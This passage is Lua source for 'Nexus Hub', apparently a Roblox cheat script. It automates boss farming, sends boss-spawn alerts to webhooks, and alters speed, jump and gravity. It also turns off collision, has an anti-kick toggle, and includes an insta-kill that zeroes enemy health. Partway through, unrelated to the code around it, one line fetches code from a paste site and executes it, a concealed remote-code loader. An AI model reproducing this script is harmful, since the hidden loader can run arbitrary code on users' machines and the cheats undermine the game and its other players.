    for _, kw in ipairs(SeaBossKeywordsWebhook)do
        if clean:find(kw:gsub('%s+', ''), 1, true) then
            return true
        end
    end

    return false
end
local function GetSpecialBossEntry(npcName)
    local clean = npcName:lower():gsub('%s+', ''):gsub('_', '')

    for _, entry in ipairs(SpecialBossWebhookList)do
        local matchClean = entry.match:lower():gsub('%s+', ''):gsub('_', '')

        if clean:find(matchClean, 1, true) or matchClean:find(clean, 1, true) then
            return entry
        end
    end

    return nil
end

local IsPublicServer = false

task.spawn(function()
    local ok, serverType = pcall(function()
        local remote = game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType', 3)

        return remote and remote:InvokeServer() or 'Unknown'
    end)

    if ok and serverType == 'VIPServer' then
        IsPublicServer = false
    elseif game.PrivateServerId ~= '' then
        IsPublicServer = false
    else
        IsPublicServer = true
    end
end)

local function IsSeaBossModel(npcName)
    local clean = npcName:lower():gsub('%s+', ''):gsub('_', '')
    local seaKeywords = {
        'kraken',
        'seaserpent',
        'seabeast',
        'seaboss',
        'seadragon',
        'seaMonster',
        'seamonster',
    }

    for _, kw in ipairs(seaKeywords)do
        if clean:find(kw, 1, true) then
            return true
        end
    end

    return false
end
local function JoinByCode(code)
    local cleanCode = code:gsub('^Nexus_', ''):gsub('^NTT_', ''):gsub('%s+', '')

    if #cleanCode == 32 then
        local jobId = cleanCode:sub(1, 8) .. '-' .. cleanCode:sub(9, 12) .. '-' .. cleanCode:sub(13, 16) .. '-' .. cleanCode:sub(17, 20) .. '-' .. cleanCode:sub(21, 32)

        UI:Notify({
            Title = 'Joining',
            Description = 'Teleporting to server...',
            Duration = 3,
        })

        local success, err = pcall(function()
            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer)
        end)

        if not success then
            local ok2, err2 = pcall(function()
                game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, jobId)
            end)

            if not ok2 then
                UI:Notify({
                    Title = 'Join Failed',
                    Description = 'Server may be full, private, or no longer exists.\nError: ' .. tostring(err2),
                    Duration = 6,
                })
            end
        end
    else
        UI:Notify({
            Title = 'Error',
            Description = 'Invalid code! Must be 32 characters after Nexus_\nGot: ' .. #cleanCode .. ' characters',
            Duration = 4,
        })
    end
end

local WebhookTab = CreateNexusPage({Name = 'Webhook'})

WebhookTab_group = WebhookTab:AddGroup({Name = 'Join Server'})
WebhookTab_group:AddTextInput({
    Name = 'Join Code',
    Default = '',
    Placeholder = 'Enter Nexus_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
    ClearOnFocus = true,
    NumbersOnly = false,
    Flag = 'JoinCodeInput',
    Callback = function(text, enterPressed)
        if enterPressed and text and text ~= '' then
            JoinByCode(text)
        end
    end,
})
WebhookTab_group = WebhookTab:AddGroup({Name = 'Controls'})
task.spawn(function()
    task.wait(4)

    local _isVIP = false

    pcall(function()
        local remote = game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType', 3)

        if remote then
            local result = remote:InvokeServer()

            _isVIP = (result == 'VIPServer')
        end
    end)

    if _isVIP or game.PrivateServerId ~= '' then
        return
    end

    while getgenv().NexusHub do
        task.wait(3)

        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if not npc:IsA('Model') then
                continue
            end

            local hum = npc:FindFirstChildOfClass('Humanoid')

            if not (hum and hum.Health > 0) then
                continue
            end

            local key = npc.Name .. tostring(math.floor(hum.MaxHealth))

            if NotifiedBosses[key] then
                continue
            end

            local hpPercent = math.floor((hum.Health / hum.MaxHealth) * 100)

            if IsSeaBoss(npc.Name) then
                NotifiedBosses[key] = true

                local island = GetNearestIsland(npc:GetPivot().Position)

                SendWebhook(SeaBossWebhook, '\u{1f30a} Sea Boss Spawned!', '**Boss:** `' .. npc.Name .. '`\n**Location:** `' .. island .. '`\n**HP:** `' .. hpPercent .. '%`', 3447003)
            else
                local entry = GetSpecialBossEntry(npc.Name)

                if entry then
                    NotifiedBosses[key] = true

                    SendWebhook(WorldBossWebhook, '\u{2694}\u{fe0f} ' .. entry.label .. ' Spawned!', '**Boss:** `' .. entry.label .. '`\n**Location:** `' .. entry.island .. '`\n**HP:** `' .. hpPercent .. '%`', 16711680)
                end
            end
        end
        for _, obj in pairs(workspace:GetDescendants())do
            if not obj:IsA('Model') then
                continue
            end

            local n = obj.Name:lower():gsub('%s+', ''):gsub('_', '')

            if not (n:find('kraken') or n:find('seaserpent') or n:find('seabeast')) then
                continue
            end

            local bossHP = obj:GetAttribute('_BossHP') or obj:GetAttribute('BossHP')
            local hum = obj:FindFirstChildOfClass('Humanoid')
            local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

            if not alive then
                continue
            end

            local maxHP = (hum and hum.MaxHealth) or tonumber(bossHP) or 0
            local curHP = (hum and hum.Health) or tonumber(bossHP) or 0
            local hpPct = maxHP > 0 and math.floor((curHP / maxHP) * 100) or 100
            local key = obj.Name .. tostring(math.floor(maxHP))

            if NotifiedBosses[key] then
                continue
            end

            NotifiedBosses[key] = true

            local bossPos = nil

            pcall(function()
                bossPos = obj:GetPivot().Position
            end)

            if not bossPos then
                local bp = obj:FindFirstChildOfClass('BasePart') or obj.PrimaryPart

                if bp then
                    bossPos = bp.Position
                end
            end

            local island = bossPos and GetNearestIsland(bossPos) or 'Sea'
            local displayName = obj.Name

            if displayName:lower():find('kraken') then
                displayName = 'Kraken'
            elseif displayName:lower():find('seaserpent') or displayName:lower():find('sea serpent') then
                displayName = 'Sea Serpent'
            end

            SendWebhook(SeaBossWebhook, '\u{1f30a} Sea Boss Spawned!', '**Boss:** `' .. displayName .. '`\n**Location:** `' .. island .. '`\n**HP:** `' .. hpPct .. '%`', 3447003)
        end
        for key in pairs(NotifiedBosses)do
            local alive = false

            for _, npc in pairs(PATH.Mobs:GetChildren())do
                if npc:IsA('Model') then
                    local h = npc:FindFirstChildOfClass('Humanoid')
                    local k = npc.Name .. tostring(math.floor((h and h.MaxHealth) or 0))

                    if k == key and h and h.Health > 0 then
                        alive = true

                        break
                    end
                end
            end

            if not alive then
                for _, obj in pairs(workspace:GetDescendants())do
                    if obj:IsA('Model') then
                        local h = obj:FindFirstChildOfClass('Humanoid')
                        local bHP = obj:GetAttribute('_BossHP') or obj:GetAttribute('BossHP')
                        local maxHP = (h and h.MaxHealth) or tonumber(bHP) or 0
                        local k = obj.Name .. tostring(math.floor(maxHP))

                        if k == key then
                            local isAlive = (h and h.Health > 0) or (bHP and tonumber(bHP) and tonumber(bHP) > 0)

                            if isAlive then
                                alive = true

                                break
                            end
                        end
                    end
                end
            end
            if not alive then
                NotifiedBosses[key] = nil
            end
        end
    end
end)
ServerTab_group = ServerTab:AddGroup({Name = 'Server Management'})
ServerTab_group:AddButton({
    Name = 'Redeem All Codes',
    Callback = function()
        for code, data in pairs(Modules.Codes.Codes)do
            if Plr.Data.Level.Value >= (data.LevelReq or 0) then
                UI:Notify({
                    Title = 'Code',
                    Description = 'Redeeming: ' .. code,
                    Duration = 3,
                })
                Remotes.UseCode:InvokeServer(code)
                task.wait(2)
            end
        end
    end,
})
loadstring(game:HttpGet('https://pastefy.app/HHTpYAfl/raw'))()
task.wait(0.5)
ServerTab_group:AddButton({
    Name = 'Hide Boss Status',
    Callback = function()
        local p = game.Players.LocalPlayer.PlayerGui:FindFirstChild('BossStatusGUI')

        if p then
            local panel = p:FindFirstChild('BossPanel')

            if panel then
                panel.Visible = not panel.Visible
            end
        end
    end,
})
ServerTab_group:AddToggle({
    Name = 'Anti AFK',
    Default = true,
    Flag = 'AntiAFK',
    Callback = function(v)
        Toggles.AntiAFK = {Value = v}
    end,
})
ServerTab_group:AddToggle({
    Name = 'Anti Kick (Client)',
    Default = false,
    Flag = 'AntiKick',
    Callback = function(v)
        Toggles.AntiKick = {Value = v}
    end,
})
ServerTab_group:AddToggle({
    Name = 'Auto Reconnect',
    Default = false,
    Flag = 'AutoReconnect',
    Callback = function(v)
        Toggles.AutoReconnect = {Value = v}

        if v then
            Func_AutoReconnect()
        end
    end,
})
ServerTab_group:AddToggle({
    Name = 'No Gameplay Paused',
    Default = false,
    Flag = 'NoGameplayPaused',
    Callback = function(v)
        Toggles.NoGameplayPaused = {Value = v}

        Thread('NoGameplayPaused', SafeLoop('Anti-Pause', Func_NoGameplayPaused), v)
    end,
})
ServerTab_group:AddButton({
    Name = 'Rejoin',
    Callback = function()
        local TARGET_PLACE_ID = 77747658251236

        TeleportService:Teleport(TARGET_PLACE_ID, Plr)
    end,
})
ServerTab_group = ServerTab:AddGroup({Name = 'Prompt'})
ServerTab_group:AddToggle({
    Name = 'Instant Proximity Prompt',
    Default = false,
    Flag = 'InstantPP',
    Callback = function(v)
        Toggles.InstantPP = {Value = v}
    end,
})
ServerTab_group = ServerTab:AddGroup({Name = 'Auto Kick'})
ServerTab_group:AddToggle({
    Name = 'Auto Kick',
    Default = true,
    Flag = 'AutoKick',
    Callback = function(v)
        Toggles.AutoKick = {Value = v}

        if v then
            InitAutoKick()
        end
    end,
})
ServerTab_group:AddMultiDropdown({
    Name = 'Kick Type(s)',
    Options = {
        'Mod',
        'Player Join',
        'Public Server',
    },
    Default = {
        'Mod',
    },
        Flag = 'SelectedKickType',
    Callback = function(v)
        Options.SelectedKickType = ToSet(v)
        CheckServerTypeSafety()
    end,
})

Options.SelectedKickType = {Mod = true}

local configTab = CreateNexusPage({Name = 'Config'})
configTab_group = configTab:AddGroup({Name = 'Config'})

local SelectedConfigName = ConfigName

local ConfigNameInput = configTab_group:AddTextInput({
    Name = 'Config Name',
    Placeholder = 'Enter config name',
    Default = ConfigName,
    Flag = 'ConfigName',
    Callback = function(v)
        local value = tostring(v or ''):gsub('^%s+', ''):gsub('%s+$', '')
        SelectedConfigName = value ~= '' and value or ConfigName
    end,
})

local function GetSelectedConfigName()
    local rawValue = SelectedConfigName
    if ConfigNameInput and type(ConfigNameInput.Get) == 'function' then
        rawValue = ConfigNameInput:Get()
    end

    local value = tostring(rawValue or ''):gsub('^%s+', ''):gsub('%s+$', '')
    return value ~= '' and value or ConfigName
end

configTab_group:AddButton({
    Name = 'Save Config',
    Callback = function()
        local ok, result = UI:SaveConfig(GetSelectedConfigName())
        UI:Notify({
            Title = 'Config',
            Description = ok and ('Saved config: ' .. tostring(result)) or ('Save failed: ' .. tostring(result)),
            Duration = 4,
        })
    end,
})
configTab_group:AddButton({
    Name = 'Load Config',
    Callback = function()
        local ok, result = UI:LoadConfig(GetSelectedConfigName())
        UI:Notify({
            Title = 'Config',
            Description = ok and ('Loaded config: ' .. tostring(result)) or ('Load failed: ' .. tostring(result)),
            Duration = 4,
        })
    end,
})
task.spawn(function()
    while task.wait() do
        if not getgenv().NexusHub then
            break
        end
        if Toggles.Fullbright and Toggles.Fullbright.Value then
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            Lighting.GlobalShadows = false
        elseif Toggles.OverrideTime and Toggles.OverrideTime.Value then
            Lighting.ClockTime = Options.OverrideTimeValue or 12
        end
        if Toggles.NoFog and Toggles.NoFog.Value then
            Lighting.FogEnd = 9e9
        end
    end
end)

Connections.Player_General = RunService.Stepped:Connect(function()
    local hum = Plr.Character and Plr.Character:FindFirstChildOfClass('Humanoid')

    if hum then
        if Toggles.WS and Toggles.WS.Value then
            hum.WalkSpeed = Options.WSValue or 16
        end
        if Toggles.JP and Toggles.JP.Value then
            hum.JumpPower = Options.JPValue or 50
            hum.UseJumpPower = true
        end
        if Toggles.HH and Toggles.HH.Value then
            hum.HipHeight = Options.HHValue or 2
        end
    end

    workspace.Gravity = (Toggles.Grav and Toggles.Grav.Value) and (Options.GravValue or 196) or 192

    if Toggles.FOV and Toggles.FOV.Value then
        workspace.CurrentCamera.FieldOfView = Options.FOVValue or 70
    end
    if Toggles.Zoom and Toggles.Zoom.Value then
        Plr.CameraMaxZoomDistance = Options.ZoomValue or 128
    end
end)

RunService.Stepped:Connect(function()
    if Shared.Farm and Shared.Target then
        local char = GetCharacter()

        if char then
            for _, part in pairs(char:GetDescendants())do
                if part:IsA('BasePart') and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end
end)
game:GetService('ProximityPromptService').PromptButtonHoldBegan:Connect(function(prompt)
    if Toggles.InstantPP and Toggles.InstantPP.Value then
        prompt.HoldDuration = 0
    end
end)

local NotifFrame = PGui:WaitForChild('NotificationUI'):WaitForChild('NotificationsFrame')
local NotificationBlacklist = {
    "You don't have this item!",
    'Not enough ',
}

function ProcessNotification(frame)
    task.delay(0.01, function()
        if not (Toggles.AutoDeleteNotif and Toggles.AutoDeleteNotif.Value) then
            return
        end
        if not frame or not frame.Parent then
            return
        end

        local lbl = frame:FindFirstChild('Txt', true)

        if lbl and lbl:IsA('TextLabel') then
            local txt = lbl.Text:lower()

            for _, phrase in ipairs(NotificationBlacklist)do
                if txt:find(phrase:lower()) then
                    frame.Visible = false

                    break
                end
            end
        end
    end)
end

NotifFrame.ChildAdded:Connect(ProcessNotification)

for _, c in pairs(NotifFrame:GetChildren())do
    ProcessNotification(c)
end

task.spawn(function()
    while task.wait() do
        if not Shared.Farm or Shared.MerchantBusy then
            continue
        end
        if not Shared.Target or not Shared.TargetValid then
            continue
        end

        local char = GetCharacter()
        local target = Shared.Target

        if not char or not target then
            continue
        end

        local npcHum = GetHumanoid(target)
        local npcRoot = target:FindFirstChild('HumanoidRootPart')
        local root = char:FindFirstChild('HumanoidRootPart')

        if not (npcHum and npcRoot and root) then
            continue
        end

        EquipWeapon()

        if npcHum.Health <= 0 and not (Toggles.InstaKill and Toggles.InstaKill.Value) then
            continue
        end

        local dist = (root.Position - npcRoot.Position).Magnitude
        local delay = Options.M1Speed or 0.15

        Shared.LastM1 = Shared.LastM1 or 0

        if dist <= 35 and (time() - Shared.LastM1) >= delay then
            pcall(function()
                Remotes.M1:FireServer()
            end)

            Shared.LastM1 = time()
        end
    end
end)
task.spawn(function()
    while task.wait() do
        if not Shared.Farm or Shared.MerchantBusy then
            Shared.Target = nil

            continue
        end

        local char = GetCharacter()

        if not char or Shared.Recovering then
            continue
        end
        if Shared.TargetValid and (not Shared.Target or not Shared.Target.Parent or (Shared.Target:FindFirstChildOfClass('Humanoid') and Shared.Target:FindFirstChildOfClass('Humanoid').Health <= 0)) then
            Shared.KillTick = tick()
            Shared.TargetValid = false
        end
        if tick() - Shared.KillTick < (Options.TargetTPCD or 0) then
            continue
        end

        HandleSummons()

        local cur, max = GetCurrentPity()
        local isPityReady = (Toggles.PityBossFarm and Toggles.PityBossFarm.Value) and cur >= (max - 1)
        local found = false

        if isPityReady then
            local t, isl, ft = GetPityTarget()

            if t then
                found = true
                Shared.Target = t
                Shared.TargetValid = true

                UpdateSwitchState(t, ft)
                ExecuteFarmLogic(t, isl, ft)
            end
        end
        if not found then
            if Toggles.AutoCosmicBoss and Toggles.AutoCosmicBoss.Value then
                local boss = FindLiveBossAnywhere(CosmicBossKeywords)

                if boss then
                    found = true
                    Shared.Target = boss
                    Shared.TargetValid = true

                    EquipWeapon()
                    UpdateSwitchState(boss, 'Boss')
                    ExecuteFarmLogic(boss, 'Boss', 'Boss')
                    pcall(function()
                        Remotes.M1:FireServer()
                    end)
                end
            end
            if not found and Toggles.AutoKillDio and Toggles.AutoKillDio.Value then
                local boss = GetBestMobCluster({
                    TheWorldBoss_Normal = true,
                    TheWorldBoss_Medium = true,
                    TheWorldBoss_Hard = true,
                    TheWorldBoss_Extreme = true,
                })

                if boss then
                    found = true
                    Shared.Target = boss
                    Shared.TargetValid = true

                    EquipWeapon()
                    UpdateSwitchState(boss, 'Boss')
                    ExecuteFarmLogic(boss, GetNearestIsland(boss:GetPivot().Position), 'Boss')
                    pcall(function()
                        Remotes.M1:FireServer()
                    end)
                end
            end
            if not found and Toggles.AutoSeaBoss and Toggles.AutoSeaBoss.Value then
                local boss = nil

                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if npc:IsA('Model') then
                        local n = npc.Name:lower():gsub('%s+', ''):gsub('_', '')

                        if n:find('kraken') or n:find('seaserpent') or n:find('seabeast') then
                            local bossHP = npc:GetAttribute('_BossHP') or npc:GetAttribute('BossHP')
                            local hum = npc:FindFirstChildOfClass('Humanoid')
                            local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

                            if alive then
                                boss = npc

                                break
                            end
                        end
                    end
                end

                if not boss then
                    for _, npc in pairs(workspace:GetDescendants())do
                        if npc:IsA('Model') then
                            local n = npc.Name:lower():gsub('%s+', ''):gsub('_', '')

                            if n:find('kraken') or n:find('seaserpent') or n:find('seabeast') then
                                local bossHP = npc:GetAttribute('_BossHP') or npc:GetAttribute('BossHP')
                                local hum = npc:FindFirstChildOfClass('Humanoid')
                                local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

                                if alive then
                                    boss = npc

                                    break
                                end
                            end
                        end
                    end
                end
                if boss then
                    found = true
                    Shared.Target = boss
                    Shared.TargetValid = true
                    Shared.SeaBossFound = true

                    UpdateSwitchState(boss, 'Boss')

                    local root = char and char:FindFirstChild('HumanoidRootPart')

                    if root then
                        local bossPos = GetSeaBossPosition(boss)

                        if bossPos then
                            local yOffset = Options.SeaBossYOffset or SEA_BOSS_Y_OFFSET
                            local targetPos = bossPos + Vector3.new(0, yOffset, 0)
                            local dest = CFrame.new(targetPos)
                            local dist = (root.Position - targetPos).Magnitude

                            if dist > 3 then
                                local speed = Options.TweenSpeed or 160
                                local duration = math.clamp(dist / speed, 0.05, 0.4)
                                local tw = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = dest})

                                tw:Play()
                            end

                            root.AssemblyLinearVelocity = Vector3.zero
                            root.AssemblyAngularVelocity = Vector3.zero
                        end
                    end

                    EquipWeapon()
                    pcall(function()
                        Remotes.M1:FireServer()
                    end)

                    Shared.LastM1 = time()

                    FireSkillsWithPositionLock()

                    if Toggles.InstaKill and Toggles.InstaKill.Value then
                        local hum = boss:FindFirstChildOfClass('Humanoid')

                        if hum then
                            pcall(function()
                                hum.Health = 0
                            end)
                        end
                    end
                else
                    Shared.SeaBossFound = false
                end
            end
            if not found and Toggles.AutoFarmEggs and Toggles.AutoFarmEggs.Value then
                local bunnyDict = {}

                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if npc:IsA('Model') then
                        local n = npc.Name:lower()

                        if n:find('bunny') or n:find('easter') or n:find('rabbit') then
                            bunnyDict[npc.Name:gsub('%d+$', '')] = true
                        end
                    end
                end

                local target = GetBestMobCluster(bunnyDict)

                if target then
                    found = true
                    Shared.Target = target
                    Shared.TargetValid = true

                    EquipWeapon()
                    UpdateSwitchState(target, 'Mob')
                    ExecuteFarmLogic(target, GetNearestIsland(target:GetPivot().Position), 'Mob')
                    pcall(function()
                        Remotes.M1:FireServer()
                    end)
                end
            end
            if not found then
                for i = 1, #DefaultPriority do
                    local taskName = DefaultPriority[i]

                    if not taskName then
                        continue
                    end
                    if isPityReady and (taskName == 'World Boss Farm' or taskName == 'Farm All Mobs' or taskName == 'Selected Mob Farm' or taskName == 'Boss' or taskName == 'All Mob Farm' or taskName == 'Mob') then
                        continue
                    end

                    local t, isl, ft = CheckTask(taskName)

                    if t then
                        found = true
                        Shared.Target = typeof(t) == 'Instance' and t or nil
                        Shared.TargetValid = true

                        UpdateSwitchState(t, ft)

                        if taskName ~= 'Merchant' and taskName ~= 'Auto Merchant' and t then
                            ExecuteFarmLogic(t, isl, ft)
                        end

                        break
                    end
                end
            end
        end
        if not found then
            Shared.Target = nil

            UpdateSwitchState(nil, 'None')
        end
    end
end)
task.spawn(function()
    while task.wait(0.2) do
        if not Shared.Target or not Shared.TargetValid then
            continue
        end

        local target = Shared.Target
        local hum = target:FindFirstChildOfClass('Humanoid')
        local mobName = target.Name or 'Unknown'
        local hp = hum and math.floor(hum.Health) or 0
        local maxhp = hum and math.floor(hum.MaxHealth) or 0
        local questName = 'None'

        if Shared.QuestNPC and Modules.Quests and Modules.Quests.RepeatableQuests then
            local q = Modules.Quests.RepeatableQuests[Shared.QuestNPC]

            if q and q.requirements and q.requirements[1] then
                questName = q.requirements[1].npcType or 'Unknown'
            end
        end

        FarmStatus.Text = 'Mob: ' .. mobName .. '\nHP: ' .. hp .. '/' .. maxhp .. '\nQuest: ' .. questName
    end
end)
task.spawn(function()
    while task.wait(0.1) do
        if not (Toggles.LevelFarm and Toggles.LevelFarm.Value) then
            continue
        end
        if not (Toggles.BringMob and Toggles.BringMob.Value) then
            continue
        end
        if not Shared.Target then
            continue
        end

        local target = Shared.Target
        local targetRoot = target:FindFirstChild('HumanoidRootPart')

        if not targetRoot then
            continue
        end

        for _, mob in pairs(PATH.Mobs:GetChildren())do
            if mob ~= target and mob:IsA('Model') then
                local hum = mob:FindFirstChildOfClass('Humanoid')
                local root = mob:FindFirstChild('HumanoidRootPart')

                if hum and root and hum.Health > 0 then
                    if IsSmartMatch(mob.Name, target.Name) then
                        if (root.Position - targetRoot.Position).Magnitude <= 80 then
                            root.CFrame = targetRoot.CFrame * CFrame.new(math.random(-5, 5), 0, math.random(-5, 5))
                            root.AssemblyLinearVelocity = Vector3.zero
                        end
                    end
                end
            end
        end
    end
end)
task.spawn(function()
    while task.wait(1) do
        if not getgenv().NexusHub then
            break
        end

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if root and not Shared.MovingIsland then
            local pos = root.Position

            if pos.Y > 5000 or math.abs(pos.X) > 10000 or math.abs(pos.Z) > 10000 then
                Shared.Recovering = true

                UI:Notify({
                    Title = 'Recovery',
                    Description = 'Out of bounds detected! Resetting...',
                    Duration = 5,
                })

                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero

                if IslandCrystals.Starter then
                    root.CFrame = IslandCrystals.Starter:GetPivot() * CFrame.new(0, 5, 0)

                    task.wait(1)
                end

                Shared.Recovering = false
            end
        end
    end
end)
task.spawn(Func_AutoTrade)
ACThing(true)
task.spawn(function()
    while getgenv().NexusHub do
        if Remotes.ReqInventory then
            Remotes.ReqInventory:FireServer()
        end

        task.wait(30)
    end
end)
task.spawn(function()
    if Remotes.ReqInventory then
        Remotes.ReqInventory:FireServer()
    end

    local timeout = 0

    while not Shared.InventorySynced and timeout < 5 do
        task.wait(0.15)

        timeout = timeout + 0.15
    end
end)

getgenv().NexusHub = true

UI:Notify({
    Title = 'Nexus Hub',
    Description = 'Script Loaded!',
    Duration = 5,
})
